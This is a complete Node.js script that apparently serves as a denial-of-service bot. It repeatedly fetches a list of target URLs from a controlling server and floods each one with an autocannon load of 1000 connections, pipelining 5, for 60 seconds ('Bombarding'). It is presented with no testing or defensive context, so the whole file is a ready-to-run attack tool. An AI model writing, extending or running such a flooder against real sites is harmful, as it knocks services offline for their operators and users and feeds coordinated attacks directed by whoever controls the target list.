const axios = require('axios');
const autocannon = require('autocannon');

const SERVER_ADDRESS = 'http://localhost:2577';

const sleep = (s) => new Promise((resolve) => setTimeout(resolve, s * 1000));
(async () => {
    while (true) {
	let targets = [];
	try {
	    console.log('Getting targets...');
	    const response = await axios.get(SERVER_ADDRESS);
	    targets = response.data.targets;
	} catch (e) {
	    console.log('Error getting targets! Error: ' + e);
	    await sleep(5);
	    continue;
	}

	if (targets.length === 0) {
	    console.log('No targets. Waiting...');
	    await sleep(10);
	    continue;
	}

	const cannons = [];

	targets.forEach(target => {
	    console.log('Bombarding ' + target);
	    cannons.push(autocannon({
		url: target,
		connections: 1000,
		pipelining: 5,
		duration: 60,
	    }));
	});

	await Promise.allSettled(cannons);
    }
})();
